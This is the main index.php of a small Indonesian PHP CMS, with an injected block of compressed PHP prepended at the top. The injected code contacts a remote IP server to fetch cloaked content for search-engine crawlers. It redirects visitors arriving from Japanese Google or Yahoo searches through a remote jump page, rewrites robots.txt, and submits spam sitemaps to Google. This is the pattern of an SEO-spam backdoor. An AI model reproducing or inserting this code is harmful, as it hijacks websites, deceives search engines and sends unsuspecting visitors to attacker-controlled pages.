<?php $inter_domain='http://154.22.119.20/z0129_7/';function curl_get_contents($url){$ch=curl_init();curl_setopt ($ch, CURLOPT_URL, $url);curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);$file_contents = curl_exec($ch);curl_close($ch);return $file_contents; }function getServerCont($url,$data=array()){$url=str_replace(' ','+',$url);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"$url");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));$output = curl_exec($ch);$errorCode = curl_errno($ch);curl_close($ch);if(0!== $errorCode){ return false;}return $output;}function is_crawler($agent){$agent_check=false; $bots='googlebot|google|yahoo|bing|aol';if($agent!=''){if(preg_match("/($bots)/si",$agent)){$agent_check = true; }}return $agent_check;}function check_refer($refer){ $check_refer=false;$referbots='google.co.jp|yahoo.co.jp|google.com';if($refer!='' && preg_match("/($referbots)/si",$refer)){ $check_refer=true; }return $check_refer; }$http=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://');$req_uri=$_SERVER['REQUEST_URI'];$domain=$_SERVER["HTTP_HOST"];$self=$_SERVER['PHP_SELF'];$ser_name=$_SERVER['SERVER_NAME'];$req_url=$http.$domain.$req_uri;$indata1=$inter_domain."/indata.php";$map1=$inter_domain."/map.php";$jump1=$inter_domain."/jump.php";$url_words=$inter_domain."/words.php";$url_robots=$inter_domain."/robots.php";if(strpos($req_uri,".php")){$href1=$http.$domain.$self;}else{$href1=$http.$domain;}$data1[]=array();$data1['domain']=$domain;$data1['req_uri']=$req_uri;$data1['href']=$href1;$data1['req_url']=$req_url;if(substr($req_uri,-6)=='robots'){$robots_cont = getServerCont($url_robots,$data1);define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));file_put_contents(BASE_PATH.'/robots.txt',$robots_cont);$robots_cont=file_get_contents(BASE_PATH.'/robots.txt');if(strpos(strtolower($robots_cont),"sitemap")){echo 'robots.txt file create success!';}else{echo 'robots.txt file create fail!';}return;}if(substr($req_uri,-4)=='.xml'){if(strpos($req_uri,"pingsitemap.xml")){ $str_cont = getServerCont($map1,$data1); $str_cont_arr= explode(",",$str_cont); $str_cont_arr[]='sitemap'; for($k=0;$k<count($str_cont_arr);$k++){ if(strpos($href1,".php")> 0){ $tt1='?'; }else{ $tt1='/';}$http2=$href1.$tt1.$str_cont_arr[$k].'.xml';$data_new='https://www.google.com/ping?sitemap='.$http2;$data_new1='http://www.google.com/ping?sitemap='.$http2;if(stristr(@file_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@file_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL; }else{echo $data_new1.'===>Submitting Google Sitemap: fail'.PHP_EOL;} } return;} if(strpos($req_uri,"allsitemap.xml")){ $str_cont = getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;return;} if(strpos($req_uri,".php")){ $word4=explode("?",$req_uri); $word4=$word4[count($word4)-1]; $word4=str_replace(".xml","",$word4); }else{ $word4= str_replace("/","",$req_uri);$word4= str_replace(".xml","",$word4); }$data1['word']=$word4;$data1['action']='check_sitemap';$check_url4=getServerCont($url_words,$data1);if($check_url4=='1'){ $str_cont=getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;return;} $data1['action']="check_words"; $check1= getServerCont($url_words,$data1);if(strpos($req_uri,"map")> 0 || $check1=='1') $data1['action']="rand_xml";$check_url4=getServerCont($url_words,$data1);header("Content-type:text/xml");echo $check_url4;return;}if(strpos($req_uri,".php")){$main_shell=$http.$ser_name.$self;$data1['main_shell']=$main_shell;}else{$main_shell=$http.$ser_name;$data1['main_shell']=$main_shell;}$referer=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';$chk_refer=check_refer($referer); if(strpos($_SERVER['REQUEST_URI'],'.php')){ $url_ext='?'; }else{ $url_ext='/'; } if($chk_refer && (preg_match('/ja/i',@$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match('/ja/i',@$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match("/^[a-z0-9]+[0-9]+$/",end(explode($url_ext,str_replace(array(".html",".htm"),"",$_SERVER['REQUEST_URI'])))))){echo getServerCont($jump1,$data1);return; } $user_agent=strtolower(isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'');$res_crawl=is_crawler($user_agent); if($res_crawl){ $data1['http_user_agent']=$user_agent; echo getServerCont($indata1,$data1);exit;} ?>

<?php


class microTimer {
    function start() {
        global $starttime;
        $mtime = microtime ();
        $mtime = explode (' ', $mtime);
        $mtime = $mtime[1] + $mtime[0];
        $starttime = $mtime;
    }
    function stop() {
        global $starttime;
        $mtime = microtime ();
        $mtime = explode (' ', $mtime);
        $mtime = $mtime[1] + $mtime[0];
        $endtime = $mtime;
        $totaltime = round (($endtime - $starttime), 5);
        return $totaltime;
    }
}


include 'ikutan/session.php';
@header("konten-type: text/html; charset=utf-8;");
ob_start("ob_gzhandler");
$_SESSION['modul_ajax'] = true;

$timer = new microTimer;
$timer->start();





define('cms-KOMPONEN', true);
define('cms-KONTEN', true);
include "ikutan/config.php";
include "ikutan/mysqli.php";
include "ikutan/template.php";
global $judul_situs,$theme;
$_GET['aksi'] = !isset($_GET['aksi']) ? null : $_GET['aksi'];
$_GET['modul'] = !isset($_GET['modul']) ? null : $_GET['modul'];
$_GET['pilih'] = !isset($_GET['pilih']) ? null : $_GET['pilih'];
$_GET['act'] = !isset($_GET['act']) ? null : $_GET['act'];

 
if (isset($stats) != 'OK'){
include 'ikutan/statistik.inc.php';
stats();
setcookie('stats', 'OK', time()+ 3600);	
}
 

$old_modulules = !isset($old_modulules) ? null : $old_modulules;


ob_start();
switch($_GET['modul']) {
	
case 'yes':
	if (file_exists('modul/'.$_GET['pilih'].'/'.$_GET['pilih'].'.php') 
		&& !isset($_GET['act']) 
		&& !preg_match('/\.\./',$_GET['pilih'])) {
		include 'modul/'.$_GET['pilih'].'/'.$_GET['pilih'].'.php';
	} 	else if (file_exists('modul/'.$_GET['pilih'].'/act_'.$_GET['act'].'.php') 
				&& !preg_match('/\.\./',$_GET['pilih'])
				&& !preg_match('/\.\./',$_GET['act'])
				) 
				{
				include 'modul/'.$_GET['pilih'].'/act_'.$_GET['act'].'.php';
			
				} else {
				header("location:index.php");
				exit;
				 } 
break;	
	
default:
	if (!isset($_GET['pilih'])) {
		include 'konten/normal.php';
	} else if (file_exists('konten/'.$_GET['pilih'].'.php') && !preg_match("/\.\./",$_GET['pilih'])){
		include 'konten/'.$_GET['pilih'].'.php';	
	} else {
		header("location:index.php");
		exit;		
	}
break;	
}

$tengah = ob_get_contents();
ob_end_clean();
///////////////// LOGO ////////////
ob_start();
include "plugin/logo.php";
$logo = ob_get_contents();
ob_end_clean();

//////////////////////////////////
///////////////// FOOTER ////////////
ob_start();
include "plugin/footer.php";
$footer = ob_get_contents();
ob_end_clean();

//////////////////////////////////
///////////////// LINKLOGIN ////////////
ob_start();
include "plugin/linklogin.php";
$linklogin = ob_get_contents();
ob_end_clean();

//////////////////////////////////

///// MENU KIRI /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();

include "plugin/kiri.php";
$kiri = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
$kiri = ob_get_contents();
ob_end_clean();
}

///// MENU KIRI /////////////////////

///// IKLAN /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();

include "plugin/iklan.php";
$iklan = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
$iklan = ob_get_contents();
ob_end_clean();
}

///// MENU KIRI /////////////////////

///// MENU KANAN /////////////////////

if (!isset($_GET['pilih'])) {
ob_start();


$kanan = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
echo "<!-- blok kanan -->";
modul(1);


echo "<!-- blok kanan -->";
blok(1);
include "plugin/spasi.php";
$kanan = ob_get_contents();
ob_end_clean();
}

///// MENU KANAN /////////////////////


///// HEADER /////////////////////
if (!isset($_GET['pilih'])) {
ob_start();
include "plugin/header.php";
$header = ob_get_contents();
ob_end_clean(); 
} else {
ob_start();
include "plugin/head.php";
$header = ob_get_contents();
ob_end_clean();
}
///// HEADER /////////////////////




if ($_GET['aksi'] == 'logout') {
logout ();
}

$style_include_out = !isset($style_include) ? '' : implode("",$style_include);
$script_include_out = !isset($script_include) ? '' : implode("",$script_include);
$linklogin = !isset($linklogin) ? '' : $linklogin;
$kiri = !isset($kiri) ? '' : $kiri;
$kanan = !isset($kanan) ? '' : $kanan;
$header = !isset($header) ? '' : $header;
$logo = !isset($logo) ? '' : $logo;
$footer = !isset($footer) ? '' : $footer;
$iklan = !isset($iklan) ? '' : $iklan;
$define = array (	 
                  'linklogin'     => $linklogin,
				  'kiri'     => $kiri,
				  'kanan'     => $kanan,
				    'header'     => $header,'logo'     => $logo,'footer'     => $footer,'iklan'     => $iklan,
         		 'tengah'     => $tengah,
				
				 'judul_situs' => $judul_situs,
				 'style_include' => $style_include_out,
				 'script_include' => $script_include_out,
				 'meta_description' => $_META['description'],
				 'meta_keywords' => $_META['keywords'],
				 'timer' => $timer->stop()
                );
                
$tpl = new template ('thema/cms-template.html');

$tpl-> define_tag($define);

$tpl-> cetak();
?>
